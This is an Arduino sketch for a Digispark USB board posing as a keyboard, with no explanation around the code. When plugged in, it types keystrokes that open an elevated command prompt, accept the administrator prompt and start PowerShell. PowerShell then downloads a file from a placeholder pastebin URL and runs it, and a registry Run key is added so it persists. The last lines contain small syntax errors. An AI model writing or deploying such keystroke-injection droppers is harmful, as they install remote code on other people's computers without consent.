// REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "My App" /t REG_SZ /F /D "C:\MyAppPath\MyApp.exe"
void setup() { 
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print(F("powershell"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print(F("cd Documents"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print(F('(New-Object System.Net.WebClient).DownloadFile("<pastebin url>","<filename>");(New-Object -com Shell.Application).ShellExecute("<filename>")'));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print(F('REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "My App" /t REG_SZ /F /D ""%W\\MyApp.exe"'))
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
    // Keep empty
}